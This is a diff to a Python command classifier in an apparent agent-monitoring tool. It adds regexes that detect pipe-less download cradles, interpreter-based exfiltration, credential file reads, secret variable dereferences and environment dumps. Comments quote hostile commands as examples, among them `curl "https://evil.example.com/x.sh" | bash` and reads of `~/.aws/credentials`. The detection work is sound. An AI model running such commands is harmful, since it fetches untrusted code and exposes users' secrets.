@@ -52,6 +52,37 @@ PIPE_TO_SHELL = re.compile(
     re.IGNORECASE,
 )
 
+# The same cradle without a pipe. `bash <(curl -s https://host/x.sh)` and
+# `source <(curl ...)` fetch and execute in one step and never contain the `|`
+# that PIPE_TO_SHELL requires, so they walked past every download-cradle rule.
+# Found by auditing the engine for five-minute evasions rather than by a
+# detection firing, which is the point: the corpus only ever contained the
+# shapes somebody thought to write down.
+# `<(` is process substitution and `< <(` redirects from it; both are one `<`
+# away from each other and an earlier draft of this pattern required two,
+# matching neither of the forms an attacker would actually type.
+PROC_SUBST_EXEC = re.compile(
+    r"\b(?:sudo\s+)?(?:ba|z|k|da)?sh\b\s*<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b|"
+    r"\b(?:source|\.)\s+<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b|"
+    r"\b(?:python\d?|perl|ruby|node)\b[^\n|;&]*<\s*(?:<\s*)?\(\s*(?:curl|wget|iwr)\b",
+    re.IGNORECASE,
+)
+
+# An interpreter that speaks HTTP is a network client, whatever it is called.
+# `_NETWORK_CLIENT` in mitre.py listed curl, wget, nc, scp and friends, so
+# `python -c "urllib.request.urlopen(...)"` carrying a file out was tagged
+# generic Execution and `credential-exfil` could not fire on it. That is the
+# modal exfil channel in a cloud or CI environment, where curl may not even be
+# installed but a Python runtime always is.
+INTERPRETER_NETWORK = re.compile(
+    r"\b(?:python\d?|node|deno|bun|ruby|perl|php)\b[^\n]*?"
+    r"(?:urlopen|urllib|requests\.(?:get|post|put|patch|request)|httpx|"
+    r"http\.client|aiohttp|socket\.(?:socket|create_connection)|"
+    r"net/http|open-uri|Net::HTTP|LWP::|"
+    r"fetch\s*\(|axios|XMLHttpRequest|file_get_contents|curl_exec)",
+    re.IGNORECASE,
+)
+
 # `bash: rm -rf build/` is a deletion even though the tool is named "Bash".
 DELETE_COMMAND = re.compile(
     r"\brm\s+(-[a-z]*\s+)*|\brmdir\b|\bunlink\b|remove-item\b|\bdel\s+/", re.IGNORECASE
@@ -116,6 +147,91 @@ BENIGN_AFTER_STAGING = re.compile(
     re.IGNORECASE,
 )
 
+# ----------------------------------------------------------------------
+# Credential access
+#
+# This used to live only in mitre.py, as a tuple of substrings matched with
+# `p in text`. Two consequences, both real:
+#
+# 1. `.env` matched anything containing those four characters, so the module
+#    path `agentmetry.core.diagnostics.env_file` was tagged T1552.001 and
+#    manufactured the credential half of two critical findings (#40).
+# 2. It only ever described *paths*, so `echo $AWS_SECRET_ACCESS_KEY` was
+#    generic Execution. Reading a secret out of the environment is how
+#    credentials are held in every container and CI runner built this decade.
+#
+# It lives here now because the trait classifier and the MITRE mapper were two
+# classifiers making the same judgement from different data, and the sequence
+# rules trusted the one with less information. One source, one answer.
+# ----------------------------------------------------------------------
+
+# Distinctive enough that seeing them at all is worth a tag. `.aws/credentials`
+# and `.docker/config.json` do not turn up in a sentence by accident.
+CREDENTIAL_PATH = re.compile(
+    r"\.aws[/\\]credentials\b|"
+    r"\.netrc\b|\.npmrc\b|"
+    r"\.kube[/\\]config\b|"
+    r"\bcredentials\.json\b|\bservice-account\b|"
+    r"\bsecrets\.ya?ml\b|"
+    r"\.docker[/\\]config\.json\b|"
+    r"\.config[/\\]gcloud\b",
+    re.IGNORECASE,
+)
+
+# `.env` needs its own rule because it is four characters long and reads like
+# prose. Anchoring it as a filename was not enough: `git commit -m "docs:
+# explain .env handling"` still matched, and a commit message is the single
+# most likely place for a developer to type it.
+#
+# So it must look like a *path* (`~/.env`, `./.env`, `config/.env.local`) or sit
+# directly after something that reads a file. A bare mention in prose does not
+# qualify, which costs nothing: nobody reads a credential file without naming a
+# path or a verb.
+ENV_FILE = re.compile(
+    r"[\w.~$-]*[/\\]\.env(?:\.[A-Za-z0-9_-]+)?\b|"
+    r"\b(?:cat|bat|less|more|head|tail|type|source|export|dotenv|load_dotenv|"
+    r"get-content|gc|cp|mv|scp|rsync|base64|xxd|od|strings|"
+    r"grep|rg|ag|awk|sed|nano|vim|vi|emacs|code|open|start)"
+    r"\s+(?:-[-\w]+\s+)*\.env(?:\.[A-Za-z0-9_-]+)?\b|"
+    r"^\s*\.env(?:\.[A-Za-z0-9_-]+)?\b",
+    re.IGNORECASE | re.MULTILINE,
+)
+
+PRIVATE_KEY_PATH = re.compile(
+    r"\bid_(?:rsa|ed25519|dsa|ecdsa)\b|\.pem\b|-----BEGIN\b|\.ssh[/\\]",
+    re.IGNORECASE,
+)
+
+_CREDENTIAL_ENV_NAME = (
+    r"(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|AWS_SESSION_TOKEN|"
+    r"GITHUB_TOKEN|GH_TOKEN|GITLAB_TOKEN|NPM_TOKEN|PYPI_TOKEN|TWINE_PASSWORD|"
+    r"OPENAI_API_KEY|ANTHROPIC_API_KEY|HF_TOKEN|HUGGING_FACE_HUB_TOKEN|"
+    r"DOCKER_PASSWORD|KUBE_TOKEN|"
+    r"[A-Z][A-Z0-9]*_(?:API_KEY|SECRET|SECRET_KEY|ACCESS_KEY|TOKEN|PASSWORD|PASSWD))"
+)
+
+# A *live* reference, not a mention. `$AWS_SECRET_ACCESS_KEY` expands even
+# inside double quotes, which is why this is matched against the raw command
+# while path patterns are not: writing the bare name into documentation is not
+# credential access, and dereferencing it is.
+CREDENTIAL_ENV = re.compile(
+    rf"\$\{{?{_CREDENTIAL_ENV_NAME}|"
+    rf"%{_CREDENTIAL_ENV_NAME}%|"
+    rf"\$env:{_CREDENTIAL_ENV_NAME}|"
+    rf"\bprintenv\b[^\n|;&]*\b{_CREDENTIAL_ENV_NAME}|"
+    rf"\bgetenv\(\s*['\"]{_CREDENTIAL_ENV_NAME}|"
+    rf"\benviron(?:\[|\.get\(\s*)['\"]{_CREDENTIAL_ENV_NAME}",
+    re.IGNORECASE,
+)
+
+# Dumping the whole environment reads every secret in it without naming one.
+CREDENTIAL_ENV_DUMP = re.compile(
+    r"\bprintenv\b\s*(?:$|[|>;&])|"
+    r"\benv\b\s*[|>]|"
+    r"\bget-childitem\s+env:|\bgci\s+env:|\bls\s+env:",
+    re.IGNORECASE,
+)
+
 # Stable vocabulary. Renaming a trait is a breaking change for stored events:
 # rules match these strings on events that may be replayed months later.
 KNOWN_TRAITS = frozenset({
@@ -132,6 +248,8 @@ KNOWN_TRAITS = frozenset({
     "pr_desc",
     "pr_commit",
     "pr_merge",
+    "credential_access",
+    "private_key",
 })
 
 
@@ -139,8 +257,15 @@ KNOWN_TRAITS = frozenset({
 _HEREDOC_OPEN = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")
 
 
-def mask_literals(command: str) -> str:
+def mask_literals(command: str, *, include_double: bool = True) -> str:
     """Blank out quoted strings and heredoc bodies, preserving length and layout.
+
+    `include_double=False` masks only the constructs the shell treats as fully
+    literal: single quotes and heredoc bodies. Double quotes still expand `$VAR`
+    and command substitutions, so their contents are live text, not data. That
+    distinction is the whole reason this takes a flag: masking double quotes
+    everywhere would blank `"$AWS_SECRET_ACCESS_KEY"` and lose a real credential
+    dereference, while not masking them at all leaves the false positives.
 
     Trait regexes match command text, which cannot tell performing an action from
     writing about one. A command whose *content* was the string
@@ -193,7 +318,7 @@ def mask_literals(command: str) -> str:
                         out[j] = " "
                 i = min(end, n)
                 continue
-            if ch in ("'", '"'):
+            if ch == "'" or (ch == '"' and include_double):
                 quote = ch
                 out[i] = " "
             i += 1
@@ -263,46 +388,87 @@ def pipes_only_loopback(command: str) -> bool:
 
 
 def classify_command(command: str) -> list[str]:
-    """Map a plaintext command to detection trait labels (never the text itself)."""
+    """Map a plaintext command to detection trait labels (never the text itself).
+
+    Three views of the same string, because "does this command do X" and "does
+    this command mention X" are different questions and the regexes cannot tell
+    them apart on their own:
+
+    ``spoken``
+        The raw text. Used only where the shell itself would still act on
+        quoted content, which in practice means variable expansion.
+
+    ``written``
+        Quotes and heredocs blanked. Used for **command words** -- the verbs and
+        operators. `curl`, `| bash`, `rm -rf`, `gh pr merge`. A command word
+        inside quotes is not a command, it is an argument to `echo`.
+
+    ``literal``
+        Single quotes and heredocs blanked, double quotes left alone. Used for
+        **arguments** such as paths. `cat "$HOME/.aws/credentials"` is a real
+        read and must fire; `echo 'cat ~/.aws/credentials'` is prose.
+
+    The rule that falls out of this, and the one worth remembering: *the verb
+    must be unmasked, the arguments may be quoted*. Issue #41 proposed masking
+    everything for every trait, which fixes the false positives and silently
+    breaks `curl "https://evil.example.com/x.sh" | bash`, where quoting the URL
+    is simply how people write it. Trading a visible false positive for an
+    invisible false negative is a bad trade for a recorder.
+    """
     if not command or not isinstance(command, str):
         return []
     traits: list[str] = []
 
-    remote_ips = [ip for ip in RAW_IP_URL.findall(command) if not LOOPBACK_IP.match(ip)]
-    if remote_ips and DOWNLOAD_EXEC.search(command):
+    spoken = command
+    written = mask_literals(command)
+    literal = mask_literals(command, include_double=False)
+
+    # The IP may legitimately sit inside quotes; the fetch verb may not.
+    remote_ips = [ip for ip in RAW_IP_URL.findall(spoken) if not LOOPBACK_IP.match(ip)]
+    if remote_ips and DOWNLOAD_EXEC.search(written):
         traits.append("raw_ip_fetch")
-    if ENCODED_CMD.search(command):
+    if ENCODED_CMD.search(written):
         traits.append("encoded_cmd")
-    if PIPE_TO_SHELL.search(command):
+    cradle = PIPE_TO_SHELL.search(written) or PROC_SUBST_EXEC.search(written)
+    if cradle:
         traits.append(
-            "pipe_to_shell_local" if pipes_only_loopback(command) else "pipe_to_shell"
+            "pipe_to_shell_local" if pipes_only_loopback(spoken) else "pipe_to_shell"
         )
-    if CLOUD_API.search(command):
+    if CLOUD_API.search(written):
         traits.append("cloud_api")
-    if GIT_EXFIL.search(command):
+    if GIT_EXFIL.search(written):
         traits.append("git_exfil")
-    if STAGING_HOST.search(command) and (
-        STAGING_FETCH.search(command) or DOWNLOAD_EXEC.search(command)
+    if STAGING_HOST.search(spoken) and (
+        STAGING_FETCH.search(written) or DOWNLOAD_EXEC.search(written)
     ):
         traits.append("staging_fetch")
-    if not BENIGN_AFTER_STAGING.search(command) and (
-        PIPE_TO_SHELL.search(command) or RISKY_EXEC_AFTER_STAGING.search(command)
+    if not BENIGN_AFTER_STAGING.search(written) and (
+        cradle or RISKY_EXEC_AFTER_STAGING.search(written)
     ):
         traits.append("risky_exec")
-    if DELETE_COMMAND.search(command):
+    if DELETE_COMMAND.search(written):
         traits.append("delete_cmd")
-    if UNTRUSTED_INPUT_COMMAND.search(command):
+    if UNTRUSTED_INPUT_COMMAND.search(written):
         traits.append("untrusted_input")
-    # The PR traits read a masked copy: a command that *writes* `gh pr merge`
-    # into a file is not merging anything, and treating it as though it were
-    # fired `pr-merged-without-review` at critical on someone authoring a test
-    # fixture (issue #24).
-    #
-    # Only these three for now. The same confusion exists for other text traits,
-    # and the general fix means understanding shell quoting properly, so each
-    # trait wants its own corpus case before its semantics change. These are the
-    # ones with a reproducer.
-    written = mask_literals(command)
+
+    # Credential access. The env-var forms read `spoken` on purpose: `$SECRET`
+    # expands inside double quotes, so `echo "$AWS_SECRET_ACCESS_KEY"` is a real
+    # dereference. Path forms read `literal`, which is what stops a heredoc full
+    # of source code from being read as a credential read (#40).
+    if (
+        CREDENTIAL_PATH.search(literal)
+        or ENV_FILE.search(literal)
+        or CREDENTIAL_ENV.search(spoken)
+        or CREDENTIAL_ENV_DUMP.search(written)
+    ):
+        traits.append("credential_access")
+    if PRIVATE_KEY_PATH.search(literal):
+        traits.append("private_key")
+
+    # The PR traits read `written`: a command that *writes* `gh pr merge` into a
+    # file is not merging anything, and treating it as though it were fired
+    # `pr-merged-without-review` at critical on someone authoring a test fixture
+    # (issue #24).
     if PR_DESC_COMMAND.search(written):
         traits.append("pr_desc")
     if PR_COMMIT_COMMAND.search(written):
